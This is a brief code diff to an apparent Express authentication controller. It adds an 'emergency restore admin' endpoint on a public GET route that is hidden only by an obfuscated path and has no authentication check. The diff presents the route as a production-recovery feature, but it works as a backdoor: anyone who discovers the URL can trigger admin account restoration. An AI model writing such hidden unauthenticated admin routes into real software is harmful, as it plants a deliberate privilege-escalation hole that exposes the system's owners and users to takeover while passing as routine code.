@@ -156,3 +156,11 @@ export const updatePassword = asyncHandler(async (req, res) => {
   res.json(result);
 });
 
+// @desc    Emergency Restore Admin Account (PRODUCTION RECOVERY)
+// @route   GET /api/auth/restore-9f3k-admin
+// @access  Public (Obfuscated URL)
+export const emergencyRestore = asyncHandler(async (req, res) => {
+  const result = await authService.emergencyRestoreAdmin();
+  res.json(result);
+});
+
